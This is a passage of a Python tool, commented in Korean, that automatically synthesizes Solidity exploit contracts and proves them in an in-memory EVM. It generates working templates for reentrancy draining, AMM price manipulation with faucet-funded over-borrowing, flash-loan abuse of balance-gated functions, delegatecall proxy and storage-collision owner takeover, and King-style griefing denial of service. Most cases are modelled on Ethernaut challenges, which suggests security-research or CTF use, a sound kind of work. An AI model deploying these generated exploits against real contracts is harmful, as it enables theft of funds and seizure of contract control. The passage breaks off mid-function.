        if dep["form"] == "addr":
            dep_sig = f"function {depfn['name']}(address) external payable;"
            dep_call = f"t.{depfn['name']}{{value: unit}}(address(this));"
        else:
            dep_sig = f"function {depfn['name']}() external payable;"
            dep_call = f"t.{depfn['name']}{{value: unit}}();"
        for wd in withdraws[:4]:
            if wd["name"] == depfn["name"]:
                continue
            amt = len(wd["args"]) == 1
            wsig = (f"function {wd['name']}(uint256 amount) external;" if amt
                    else f"function {wd['name']}() external;")
            wcall = f"t.{wd['name']}(unit);" if amt else f"t.{wd['name']}();"
            code = (HEADER +
                "// Strategy: reentrancy synthesis (fuzz) — deposit, then re-enter the\n"
                "// value-returning function from receive() before the ledger clears.\n"
                "interface ITarget {\n"
                f"    {dep_sig}\n"
                f"    {wsig}\n"
                "}\n\n"
                "contract Exploit {\n"
                "    ITarget t; uint256 unit; uint256 depth;\n"
                "    function run(address _t) external payable {\n"
                "        t = ITarget(_t); unit = 1 ether;\n"
                f"        {dep_call}\n"
                f"        {wcall}\n"
                "    }\n"
                "    receive() external payable {\n"
                f"        if (depth < 32 && address(t).balance >= unit) {{ depth++; {wcall} }}\n"
                "    }\n"
                "}\n")
            out.append((f"reentrancy-fuzz:{depfn['name']}→{wd['name']}", code))
    return out


def _contract_bodies(src):
    """{contractName: body} — 소스 안 각 컨트랙트의 본문을 브레이스 매칭으로 뽑는다."""
    out = {}
    for mm in re.finditer(r"\bcontract\s+(\w+)", src):
        bi = src.find("{", mm.end())
        if bi < 0:
            continue
        out[mm.group(1)] = _extract_block(src, bi)
    return out


def _synth_amm(target_src, name):
    """다중 컨트랙트(대출데스크 + AMM 풀 + 토큰)가 얽힌 가격 조작을 이름에 의존하지
    않고 합성한다. 타깃이 게터로 노출한 풀·토큰을 발견하고, faucet/mint 로 자본을
    증폭(플래시론식)해 풀 준비금을 왜곡→과대평가된 담보로 초과 차입한다."""
    src = _strip_comments(target_src)
    bodies = _contract_bodies(src)
    if name not in bodies:
        return []
    contracts = set(bodies)
    # 토큰형 / 풀형 컨트랙트 식별
    def is_token(b): return ("transferFrom" in b and "approve" in b and "balanceOf" in b)
    def is_pool(b):
        has_swap = bool(re.search(r"function\s+(swap\w*|trade|exchange)\s*\(", b))
        has_price = bool(re.search(r"function\s+(spotPrice|getPrice|price\w*|quote)\s*\(", b))
        return has_swap and (has_price or "reserve" in b.lower())
    token_types = {c for c,b in bodies.items() if is_token(b)}
    pool_types  = {c for c,b in bodies.items() if is_pool(b) and c not in token_types}
    if not pool_types:
        return []
    tb = bodies[name]
    # 타깃의 공개 상태 게터: `Type public [immutable] gname;`
    getters = {}  # gname -> Type
    for tm in re.finditer(r"\b(\w+)\s+public\s+(?:immutable\s+|constant\s+)?(\w+)\s*;", tb):
        typ, g = tm.group(1), tm.group(2)
        if typ in contracts:
            getters[g] = typ
    pool_getters  = [g for g,t in getters.items() if t in pool_types]
    token_getters = [g for g,t in getters.items() if t in token_types]
    if not pool_getters or len(token_getters) < 2:
        return []
    # 풀 함수들
    pb = bodies[next(t for t in pool_types if t in getters.values() or True)]
    pool_fns = _functions(pb)
    swap_names = [f["name"] for f in pool_fns
                  if re.match(r"(swap\w*|trade|exchange)$", f["name"] or "") and
                  len(f["args"])>=1 and f["args"][0][0].startswith("uint")]
    price_names = [f["name"] for f in pool_fns
                   if re.match(r"(spotPrice|getPrice|price\w*|quote)$", f["name"] or "") and not f["args"]]
    if not swap_names or not price_names:
        return []
    price = price_names[0]
    # 타깃(데스크) 함수: faucet(무인자·자본지급) / deposit(uint·transferFrom) / borrow(uint·가격참조)
    desk_fns = _functions(tb)
    faucet = next((f["name"] for f in desk_fns
                   if not f["args"] and (re.search(r"faucet|topup|drip|claim|gimme|mint", f["name"], re.I)
                                         or "mint(msg.sender" in f["body"].replace(" ",""))), None)
    deposit = next((f["name"] for f in desk_fns
                    if len(f["args"])==1 and f["args"][0][0].startswith("uint") and "transferFrom" in f["body"]), None)
    borrow = next((f["name"] for f in desk_fns
                   if len(f["args"])==1 and f["args"][0][0].startswith("uint")
                   and (any(pg in f["body"] for pg in pool_getters)
                        or re.search(r"spotPrice|getPrice|price|quote", f["body"]))), None)
    if not (faucet and deposit and borrow):
        return []
    # 담보/차입 게터 방향은 이름 힌트로 우선, 애매하면 두 순서 모두 변형 생성
    def score_col(g): return sum(k in g.lower() for k in ("col","asset","pledge","stake","collat"))
    def score_bor(g): return sum(k in g.lower() for k in ("bor","debt","loan","cash","stable","quote","usd"))
    pairs = []
    a,b = token_getters[0], token_getters[1]
    if score_col(a)+score_bor(b) >= score_col(b)+score_bor(a):
        pairs.append((a,b))  # (collateral, borrow)
        pairs.append((b,a))
    else:
        pairs.append((b,a)); pairs.append((a,b))
    out = []
    for pg in pool_getters[:1]:
        for sw in swap_names[:2]:
            for (colg, borg) in pairs:
                code = (HEADER +
                    "// Strategy: multi-contract AMM price manipulation (flash-loan style).\n"
                    "// Amass borrow-token capital via the faucet, skew the pool reserves with\n"
                    "// a large swap to spike the collateral spot price, then over-borrow.\n"
                    "interface IERC20 { function approve(address,uint256) external returns (bool);\n"
                    "                   function balanceOf(address) external view returns (uint256); }\n"
                    "interface IPool  { function " + sw + "(uint256) external;\n"
                    "                   function " + price + "() external view returns (uint256); }\n"
                    "interface IDesk  {\n"
                    f"    function {pg}() external view returns (address);\n"
                    f"    function {colg}() external view returns (address);\n"
                    f"    function {borg}() external view returns (address);\n"
                    f"    function {faucet}() external;\n"
                    f"    function {deposit}(uint256) external;\n"
                    f"    function {borrow}(uint256) external;\n"
                    "}\n\n"
                    "contract Exploit {\n"
                    "    function run(address _t) external payable {\n"
                    "        IDesk d = IDesk(_t);\n"
                    f"        IERC20 col = IERC20(d.{colg}());\n"
                    f"        IERC20 bor = IERC20(d.{borg}());\n"
                    f"        address pool = d.{pg}();\n"
                    f"        for (uint256 i=0;i<200;i++) {{ d.{faucet}(); }}\n"
                    "        uint256 cash = bor.balanceOf(address(this));\n"
                    "        bor.approve(pool, type(uint256).max);\n"
                    f"        IPool(pool).{sw}(cash);\n"
                    "        uint256 c = col.balanceOf(address(this));\n"
                    "        require(c > 0, \"no collateral\");\n"
                    "        col.approve(_t, type(uint256).max);\n"
                    f"        d.{deposit}(c);\n"
                    f"        uint256 px = IPool(pool).{price}();\n"
                    "        uint256 value = (c * px) / 1e18;\n"
                    "        uint256 liq = bor.balanceOf(_t);\n"
                    "        uint256 amt = value < liq ? value : liq;\n"
                    f"        if (amt > 0) d.{borrow}(amt);\n"
                    "    }\n"
                    "    receive() external payable {}\n"
                    "}\n")
                out.append((f"amm-manip:{faucet}→{sw}→{deposit}→{borrow}", code))
    return out


def _synth_flashloan(target_src, name):
    """시스템 내부에 플래시론 제공자(토큰을 caller 에 빌려주고 콜백 후 상환을
    요구)가 있으면, 이를 이용해 '잔액이 큰 사람만' 호출 가능한 특권 함수를 단일
    트랜잭션에서 뚫는 차용자(borrower)를 합성한다. ERC-3156 유사 단순형을 다룬다."""
    src = _strip_comments(target_src)
    bodies = _contract_bodies(src)
    if name not in bodies:
        return []
    contracts = set(bodies)
    tb = bodies[name]
    # 타깃의 토큰형 게터 (Type public g; where Type has transfer/balanceOf)
    def is_token(b): return ("transfer" in b and "balanceOf" in b)
    token_types = {c for c,b in bodies.items() if is_token(b)}
    getters = {}
    for tm in re.finditer(r"\b(\w+)\s+public\s+(?:immutable\s+|constant\s+)?(\w+)\s*;", tb):
        if tm.group(1) in contracts:
            getters[tm.group(2)] = tm.group(1)
    tok_getters = [g for g,t in getters.items() if t in token_types]
    if not tok_getters:
        return []
    # 플래시론 제공자: uint 1개 인자 + 본문에 <tok>.transfer(msg.sender,...) + msg.sender 콜백 + balanceOf(address(this)) 상환검사
    provider = None; cb = None; tok_getter = None
    for f in _functions(tb):
        b = f["body"]
        if not (len(f["args"]) == 1 and f["args"][0][0].startswith("uint")):
            continue
        mt = re.search(r"(\w+)\s*\.\s*transfer\s*\(\s*msg\.sender", b)
        mc = re.search(r"\w+\s*\(\s*msg\.sender\s*\)\s*\.\s*(\w+)\s*\(", b)
        if mt and mc and re.search(r"balanceOf\s*\(\s*address\s*\(\s*this\s*\)\s*\)", b):
            var = mt.group(1)
            if var in getters and getters[var] in token_types:
                provider, cb, tok_getter = f["name"], mc.group(1), var
                break
    if not provider:
        return []
    # 특권 행동 후보: 제공자가 아닌 external 함수 중 ETH 를 밖으로 보내거나 owner 를 바꾸는 것
    actions = []
    for f in _functions(tb):
        if f["name"] == provider or not f.get("external"):
            continue
        b = f["body"]
        if re.search(r"\.call\s*\{\s*value\s*:", b) or re.search(r"\bowner\s*=", b):
            a = f["args"]
            if len(a) == 0:
                actions.append((f["name"], "()", ""))
            elif len(a) == 1 and a[0][0] == "address":
                actions.append((f["name"], "(address)", "payable(address(this))"))
    if not actions:
        return []
    out = []
    for (afn, asig, aarg) in actions[:4]:
        code = (HEADER +
            "// Strategy: flash-loan borrower — borrow the system's own token to meet a\n"
            "// balance-gated privileged action in one tx, act, then repay the loan.\n"
            "interface ITok { function transfer(address,uint256) external returns (bool);\n"
            "                 function balanceOf(address) external view returns (uint256); }\n"
            "interface IVault {\n"
            f"    function {provider}(uint256) external;\n"
            f"    function {tok_getter}() external view returns (address);\n"
            f"    function {afn}{asig} external;\n"
            "}\n\n"
            "contract Exploit {\n"
            "    address vault; address tok;\n"
            "    function run(address _t) external payable {\n"
            "        vault = _t; tok = IVault(_t).%s();\n" % tok_getter +
            "        uint256 amt = ITok(tok).balanceOf(_t);\n"
            "        require(amt > 0, \"no loanable\");\n"
            f"        IVault(_t).{provider}(amt);\n"
            "    }\n"
            f"    function {cb}(uint256 amount) external {{\n"
            f"        IVault(vault).{afn}({aarg});\n"
            "        ITok(tok).transfer(msg.sender, amount);\n"
            "    }\n"
            "    receive() external payable {}\n"
            "}\n")
        out.append((f"flashloan:{provider}→{afn}", code))
    return out


def _default_for_type(t, dummy="0x000000000000000000000000000000000000dEaD"):
    if t == "address": return dummy
    if t.startswith("uint") or t.startswith("int"): return 1
    if t == "bool": return False
    if re.fullmatch(r"bytes\d+", t): return bytes([0x11]) * int(t[5:])
    if t == "bytes": return b""
    if t == "string": return "t404"
    # 배열: 고정크기 T[N] 은 N개, 동적 T[] 은 빈 배열. (Privacy 의 bytes32[3] 등)
    am = re.fullmatch(r"(.+)\[(\d*)\]", t)
    if am:
        elem = _default_for_type(am.group(1), dummy)
        if elem is None:
            return None
        n = int(am.group(2)) if am.group(2) else 0
        return [elem] * n
    return None

def _abi_ctor_types(abi):
    for e in abi:
        if e.get("type") == "constructor":
            return [i["type"] for i in e.get("inputs", [])]
    return []


def _synth_ctor_args(name, contract_src):
    """타깃 생성자 인자를 시그니처에서 자동 합성한다(라이브 콘솔·매니페스트 미제공용).
    반환: (args_list, ctor_payable). 컴파일 실패/타깃 부재 시 ([], False)."""
    try:
        import solcx
        _solcv, _evm = _solc_for(contract_src)
        std = {"language":"Solidity","sources":{f"{name}.sol":{"content":contract_src}},
               "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi"]}}}}
        compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception:
        return [], False
    abi = None
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            if cn == name:
                abi = c["abi"]
    if abi is None:
        return [], False
    types = _abi_ctor_types(abi)
    return [_default_for_type(t) for t in types], _ctor_payable(abi)


def _proxy_attempt(name, target_src, invariants_src, manifest, scan_step, t0):
    """2-컨트랙트 배선: 타깃 생성자가 형제 컨트랙트 주소를 받는 시스템을 실제로
    배선해 배포하고(예: Delegation(delegate)), fallback→delegatecall 을 노리는
    calldata 셀렉터를 보내 owner/admin 탈취를 성립시킨다."""
    import solcx
    from web3 import Web3
    if not re.search(r"\bfallback\s*\(|delegatecall", target_src):
        return None
    _solcv, _evm = _solc_for(target_src)
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try:
        compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception:
        return None
    arts = {}
    for _f, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts:
        return None
    bodies = _contract_bodies(_strip_comments(target_src))
    # 타깃 생성자 파라미터 + 본문의 `SiblingType(param)` 캐스트로 형제 타입 추론
    tb = bodies.get(name, "")
    cm = re.search(r"constructor\s*\(([^)]*)\)", tb)
    params = []
    if cm and cm.group(1).strip():
        for p in cm.group(1).split(","):
            toks = p.split()
            if len(toks) >= 2:
                params.append((toks[0], toks[-1]))
    w3, acct = _mk_evm()
    accts = list(w3.eth.accounts); deployer = accts[1] if len(accts)>1 else acct
    def deploy(cn, args, frm, value=0):
        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
        tx = C.constructor(*args).transact({"from":frm,"value":value,"gas":12_000_000})
        return w3.eth.wait_for_transaction_receipt(tx).contractAddress
    # 형제 배선
    cargs = []
    wired = []
    for (typ, pname) in params:
        if typ == "address":
            m = re.search(r"(\w+)\s*\(\s*" + re.escape(pname) + r"\s*\)", tb)
            sib = m.group(1) if m else None
            if sib and sib in arts and sib != name:
                sargs = [_default_for_type(t) for t in _abi_ctor_types(arts[sib]["abi"])]
                if any(a is None for a in sargs):
                    sargs = []
                try:
                    saddr = deploy(sib, sargs, deployer)
                    cargs.append(Web3.to_checksum_address(saddr)); wired.append((pname, sib)); continue
                except Exception:
                    pass
            cargs.append("0x000000000000000000000000000000000000dEaD")
        else:
            d = _default_for_type(typ)
            cargs.append(d if d is not None else 0)
    if not wired:
        return None  # 배선된 형제가 없으면 이 경로 의미 없음
    payable_ctor = _ctor_payable(arts[name]["abi"])
    try:
        taddr = deploy(name, cargs, deployer, value=(DEFAULT_SEED_WEI if payable_ctor else 0))
    except Exception:
        try: taddr = deploy(name, cargs, deployer)
        except Exception: return None
    if taddr is None:
        return None
    tc = w3.eth.contract(address=taddr, abi=arts[name]["abi"])
    o0 = tc.functions.owner().call() if _has_getter(arts[name]["abi"],"owner") else None
    a0 = tc.functions.admin().call() if _has_getter(arts[name]["abi"],"admin") else None
    # 모든 컨트랙트의 무인자 함수 셀렉터를 fallback 으로 흘려보낸다
    sels = []
    for cn, b in bodies.items():
        for f in _functions(b):
            if not f["args"] and f["name"]:
                sels.append((f["name"], Web3.keccak(text=f"{f['name']}()")[:4].hex()))
    tester = w3.provider.ethereum_tester; snap = tester.take_snapshot()
    for fname, sel in sels:
        tester.revert_to_snapshot(snap)
        try:
            w3.eth.send_transaction({"from":acct,"to":taddr,"data":sel,"gas":1_000_000})
        except Exception:
            continue
        o1 = tc.functions.owner().call() if o0 is not None else None
        a1 = tc.functions.admin().call() if a0 is not None else None
        reason = None
        if o0 is not None and o1 != o0: reason = "owner hijacked"
        elif a0 is not None and a1 != a0: reason = "admin hijacked"
        if reason:
            wired_note = ", ".join(f"{p}={s}" for p, s in wired)
            poc = (HEADER +
                "// Strategy: 2-contract wiring + proxy calldata — the target's fallback\n"
                f"// delegatecalls a wired library ({wired_note}); sending {fname}()'s selector\n"
                "// runs it in the target's storage, seizing owner/admin.\n"
                "contract Exploit {\n"
                "    function run(address t) external payable {\n"
                f"        (bool ok,) = t.call(hex\"{sel[2:] if sel.startswith('0x') else sel}\"); require(ok);  // {fname}()\n"
                "    }\n"
                "    receive() external payable {}\n"
                "}\n")
            gen = {"step":"generate","title":"Exploit.sol 생성 (proxy-wiring)","strategy":"proxy","exploit_src":poc}
            return {"name":name,"proven":True,"firstViolated":reason,"strategy":f"proxy:{fname}",
                    "steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
                    "note":f"형제 컨트랙트를 배선({wired_note})하고 fallback→delegatecall 로 성립시켰습니다.",
                    "ms":int((time.time()-t0)*1000)}
    return None


def _slot_index(tb, var):
    """컨트랙트 본문에서 상태변수 `var` 의 스토리지 슬롯 인덱스(단순 1슬롯/변수 가정,
    constant/immutable 제외). Preservation 류 스토리지 충돌 계산용."""
    idx = 0
    for line in tb.split(";"):
        line = line.strip()
        md = re.match(r"(mapping\s*\([^)]*\)[^ ]*|address|uint\d*|int\d*|bool|bytes\d*|string|bytes)\s+"
                      r"(?:public\s+|private\s+|internal\s+)?(constant\s+|immutable\s+)?(\w+)", line)
        if not md:
            continue
        if md.group(2):   # constant/immutable → 슬롯 없음
            continue
        if md.group(3) == var:
            return idx
        idx += 1
    return None


def _synth_storage_collision(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Preservation 류: 타깃이 상태 라이브러리 주소(slot0)를 통해
    delegatecall(encodeWithSignature("g(uint256)")) 하고, 라이브러리 g 가 자기 slot0
    을 쓰는 구조. 1) 라이브러리 포인터(slot0)를 악성 Pwn 으로 덮어쓰고 2) 다시 호출해
    Pwn.g 로 owner/admin 슬롯을 탈취하는 2단계 스토리지 충돌 공격을 합성한다."""
    import solcx
    from web3 import Web3
    src = _strip_comments(target_src)
    bodies = _contract_bodies(src)
    if name not in bodies:
        return None
    tb = bodies[name]
    # delegatecall 대상이 상태변수(slot0)이고 g(uint256) 를 호출하는 함수 f(uint).
    # 콜데이터 인코딩의 세 형태를 모두 지원한다:
    #   abi.encodeWithSignature("setTime(uint256)", x)
    #   abi.encodePacked(setTimeSignature, x)      (bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)")))
    #   abi.encodeWithSelector(I.setTime.selector, x) / abi.encodeWithSelector(setTimeSignature, x)
    def _gname_from(inner):
        q = re.search(r'"(\w+)\s*\(', inner)          # 직접 시그니처 문자열
        if q: return q.group(1)
        sm = re.search(r'\.(\w+)\.selector', inner)    # I.setTime.selector
        if sm: return sm.group(1)
        idm = re.search(r'([A-Za-z_]\w*)', inner)      # 상수/변수 → 정의에서 해석
        if idm:
            sig = idm.group(1)
            cm = re.search(re.escape(sig) + r'\s*=\s*bytes4\s*\(\s*keccak256\s*\(\s*"(\w+)\s*\(', tb)
            if cm: return cm.group(1)
        return None
    f = None; libvar = None; gname = None
    for fn in _functions(tb):
        m = re.search(r"(\w+)\s*\.\s*delegatecall\s*\(\s*abi\.encode(?:WithSignature|WithSelector|Packed)\s*\(([^;]*)",
                      fn["body"])
        if m and any(a[0].startswith("uint") for a in fn["args"]):
            g = _gname_from(m.group(2))
            if g:
                f, libvar, gname = fn["name"], m.group(1), g
                break
    if not f:
        return None
    if _slot_index(tb, libvar) != 0:   # 라이브러리 포인터가 slot0 이어야 충돌 성립
        return None
    priv = "owner" if _slot_index(tb, "owner") is not None else ("admin" if _slot_index(tb, "admin") is not None else None)
    if not priv:
        return None
    k = _slot_index(tb, priv)
    _solcv, _evm = _solc_for(target_src)
    words = "".join(f"    uint256 s{i};\n" for i in range(k + 1))
    pwn_src = (HEADER + "contract Pwn {\n" + words +
               f"    function {gname}(uint256) public {{ s{k} = uint256(uint160(msg.sender)); }}\n}}\n")
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try:
        compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception:
        return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    # 라이브러리: gname(uint256) 을 가진 형제 컨트랙트
    lib = None
    for cn, b in bodies.items():
        if cn != name and re.search(r"function\s+" + re.escape(gname) + r"\s*\(\s*uint", b):
            lib = cn; break
    if lib is None or lib not in arts or "Pwn" not in arts:
        return None
    w3, acct = _mk_evm()
    accts = list(w3.eth.accounts); deployer = accts[1] if len(accts) > 1 else acct
    def dep(cn, args, frm):
        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
        return w3.eth.wait_for_transaction_receipt(
            C.constructor(*args).transact({"from":frm,"gas":12_000_000})).contractAddress
    try:
        laddr = dep(lib, [_default_for_type(t) for t in _abi_ctor_types(arts[lib]["abi"])], deployer)
        ctypes = _abi_ctor_types(arts[name]["abi"])
        cargs = [Web3.to_checksum_address(laddr) if t == "address" else _default_for_type(t) for t in ctypes]
        taddr = dep(name, cargs, deployer)
        paddr = dep("Pwn", [], acct)
    except Exception:
        return None
    tc = w3.eth.contract(address=taddr, abi=arts[name]["abi"])
    getter = priv
    o0 = tc.functions[getter]().call()
    try:
        tc.functions[f](int(paddr, 16)).transact({"from":acct,"gas":3_000_000})   # slot0(lib) := Pwn
        tc.functions[f](0).transact({"from":acct,"gas":3_000_000})                 # delegatecall Pwn -> owner
    except Exception:
        return None
    if tc.functions[getter]().call() == o0:
        return None
    poc = (HEADER +
        "// Strategy: delegatecall storage-collision (2-step). The target delegatecalls\n"
        f"// a library at slot0; step 1 overwrites that pointer with Pwn via {f}(uint(Pwn)),\n"
        f"// step 2 runs Pwn.{gname} which writes slot {k} ({priv}).\n"
        "contract Pwn {\n" + words +
        f"    function {gname}(uint256) public {{ s{k} = uint256(uint160(msg.sender)); }}\n}}\n\n"
        f"interface IT {{ function {f}(uint256) external; }}\n"
        "contract Exploit {\n"
        "    function run(address t) external payable {\n"
        "        Pwn p = new Pwn();\n"
        f"        IT(t).{f}(uint256(uint160(address(p))));\n"
        f"        IT(t).{f}(0);\n"
        "    }\n    receive() external payable {}\n}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (storage-collision)","strategy":"storage-collision","exploit_src":poc}
    dep_step = {"step":"deploy_target","title":f"타깃 {name} + 라이브러리 {lib} 배포 (in-memory EVM)",
                "address":taddr,"library_address":laddr}
    run_step = {"step":"run_exploit","title":f"Exploit(Pwn) 배포 + {f}() 2단계 delegatecall 실행",
                "exploit_address":paddr,"firstViolated":f"{priv} hijacked (storage collision)"}
    return {"name":name,"proven":True,"firstViolated":f"{priv} hijacked (storage collision)",
            "strategy":f"storage-collision:{f}","steps":[scan_step,gen,dep_step,run_step],"exploit_src":poc,"mode":"effect",
            "note":"delegatecall 스토리지 충돌로 라이브러리 포인터를 덮어쓰고 특권 슬롯을 탈취했습니다.",
            "ms":int((time.time()-t0)*1000)}


def _synth_king_dos(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut King 류 그리핑 DoS: 특권 역할(state address)이 push 송금
    (payable(role).transfer / role.send) 으로 이전 보유자에게 환불하면서 role=msg.sender
    로 갱신하는 구조. revert 하는 receive 를 가진 공격 컨트랙트가 역할을 차지하면 이후
    정상 응찰의 환불 송금이 revert 하여 역할이 영구 락된다. 베이스라인(EOA 응찰)은
    성공하지만 공격 후 동일 응찰이 revert 하는지로 DoS 를 증명한다(오탐 억제)."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    # push 송금 대상이 되는 상태 address 변수(= 이전 보유자)와 그 변수 = msg.sender 갱신
    role = None
    for m in re.finditer(r"(?:payable\s*\(\s*(\w+)\s*\)|(\w+))\s*\.\s*(?:transfer|send)\s*\(", tb):
        cand = m.group(1) or m.group(2)
        if cand and re.search(r"\b" + re.escape(cand) + r"\s*=\s*msg\.sender", tb) \
                and _slot_index(tb, cand) is not None \
                and re.search(r"\baddress\b[^;=]*\b" + re.escape(cand) + r"\b", tb):
            role = cand; break
    if not role:
        return None
    # 진입점: transfer+갱신이 receive/fallback 안이면 raw send, 아니면 무인자 payable 함수
    def _block(kind):
        mm = re.search(kind + r"\s*\([^)]*\)[^{]*\{", tb)
        return _extract_block(tb, mm.end() - 1) if mm else None
    entry_sel = None  # None → raw send(receive/fallback), else 4byte selector hex
    rb = _block("receive"); fb = _block("fallback")
    pat_here = lambda b: b is not None and (".transfer(" in b or ".send(" in b) and re.search(r"=\s*msg\.sender", b)
    if pat_here(rb) or pat_here(fb):
        entry_sel = None
    else:
        hit = None
        for fn in _functions(tb):
            if fn["payable"] and not fn["args"] and (".transfer(" in fn["body"] or ".send(" in fn["body"]) \
                    and re.search(r"=\s*msg\.sender", fn["body"]):
                hit = fn["name"]; break
        if not hit:
            return None
        entry_sel = Web3.keccak(text=f"{hit}()")[:4]
    # 응찰 임계(require(msg.value >= X))의 X 가 public getter 면 배포 후 읽는다
    gm = re.search(r"require\s*\(\s*msg\.value\s*(>=|>)\s*(\w+)", tb)
    thr_var, thr_strict = (gm.group(2), gm.group(1) == ">") if gm else (None, False)
    _solcv, _evm = _solc_for(target_src)
    pwn_src = (HEADER + "contract Pwn {\n"
               "    function run(address t, bytes memory data) external payable {\n"
               "        (bool ok,) = t.call{value: msg.value}(data); require(ok, \"take failed\");\n"
               "    }\n    receive() external payable { revert(\"grief: refuse refund\"); }\n}\n")
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try:
        compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception:
        return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts or "Pwn" not in arts:
        return None
    abi = arts[name]["abi"]
    seed = 10**18 if _ctor_payable(abi) else 0
    w3, acct = _mk_evm()
    accts = list(w3.eth.accounts)
    if len(accts) < 4:
        return None
    deployer, bidder2, bidder3 = accts[1], accts[2], accts[3]
    def dep(cn, args, frm, value=0):
        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
        r = w3.eth.wait_for_transaction_receipt(
            C.constructor(*args).transact({"from":frm,"gas":12_000_000,"value":value}))
        return r.contractAddress
    def deploy_target():
        ctypes = _abi_ctor_types(abi)
        cargs = [_default_for_type(t) for t in ctypes]
        try:
            return dep(name, cargs, deployer, value=seed)
        except Exception:
            return dep(name, cargs, deployer, value=0)
    def _ok(txh):  # eth-tester 는 revert 시 예외 대신 status=0 영수증을 준다
        try:
            return int(w3.eth.wait_for_transaction_receipt(txh).status) == 1
        except Exception:
            return False
    def take(frm, taddr, value):  # 역할 차지 시도 → 성공(True)/revert(False)
        tx = {"from":frm,"to":taddr,"value":value,"gas":1_000_000}
        if entry_sel is not None: tx["data"] = entry_sel
        try:
            return _ok(w3.eth.send_transaction(tx))
        except Exception:
            return False
    # 임계값 계산
    taddr = deploy_target()
    tc = w3.eth.contract(address=taddr, abi=abi)
    thr = seed
    if thr_var:
        try: thr = int(tc.functions[thr_var]().call())
        except Exception: thr = seed
    bid = thr + (1 if thr_strict else 0)
    if bid <= 0: bid = 1
    def _next_bid():
        if not thr_var: return bid
        try: return int(tc.functions[thr_var]().call()) + (1 if thr_strict else 0)
        except Exception: return bid
    tester = w3.provider.ethereum_tester; snap = tester.take_snapshot()
    # 1) 베이스라인: EOA 두 명이 순차 응찰 → 둘 다 성공해야 함(정상 흐름)
    baseline_ok = take(bidder2, taddr, bid) and take(bidder3, taddr, max(_next_bid(), bid))
    tester.revert_to_snapshot(snap)
    if not baseline_ok:
        return None
    # 2) 공격: revert-receive 컨트랙트가 역할 차지 → 이후 정상 응찰이 revert 해야 함
    try:
        paddr = dep("Pwn", [], acct)
    except Exception:
        return None
    data = (b"" if entry_sel is None else entry_sel)
    pwn = w3.eth.contract(address=paddr, abi=arts["Pwn"]["abi"])
    try:
        if not _ok(pwn.functions.run(taddr, data).transact({"from":acct,"value":bid,"gas":3_000_000})):
            return None  # 공격자가 역할조차 못 잡으면 성립 아님
    except Exception:
        return None
    # 정상 응찰이 이제 revert(=status 0) 하면 역할 영구 락(그리핑 DoS)
    attack_blocked = not take(bidder3, taddr, max(_next_bid(), bid))
    if not attack_blocked:
        return None
    sel_note = "receive()" if entry_sel is None else f"0x{entry_sel.hex()}"
    poc = (HEADER +
        "// Strategy: griefing DoS (Ethernaut King). The role is refunded via a push\n"
        f"// transfer to `{role}` and then set to msg.sender. An attacker whose receive()\n"
        "// reverts seizes the role; every later bid's refund transfer then reverts,\n"
        f"// permanently locking the role. Entry: {sel_note}.\n"
        "contract Exploit {\n"
        "    function run(address payable t) external payable {\n"
        + ("        (bool ok,) = t.call{value: msg.value}(\"\"); require(ok);\n" if entry_sel is None
           else f"        (bool ok,) = t.call{{value: msg.value}}(hex\"{entry_sel.hex()}\"); require(ok);\n") +
        "    }\n    receive() external payable { revert(\"refuse refund\"); }\n}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (griefing-dos)","strategy":"king-dos","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":f"role '{role}' locked via griefing DoS",
            "strategy":f"king-dos:{role}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "note":"revert 하는 receive 로 특권 역할을 차지해 이후 환불 송금을 막고 역할을 영구 락했습니다(그리핑 DoS).",
            "ms":int((time.time()-t0)*1000)}


def _synth_callback_inconsistency(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Elevator 류: 타깃이 외부 인터페이스(대개 msg.sender 캐스팅)의
    bool 반환 메서드를 한 함수 안에서 두 번 호출해 분기·상태전이를 결정한다. 공격
    컨트랙트가 그 메서드를 호출마다 다른 값(false→true)으로 구현하면, 정직한 구현이라면
    불가능한 상태 플래그(top 등) 반전을 강제할 수 있다. 플래그가 실제 뒤집히는지로 증명."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    # bool 반환 메서드를 가진 인터페이스
    cand = []
    for im in re.finditer(r"interface\s+(\w+)\s*\{([^}]*)\}", strip):
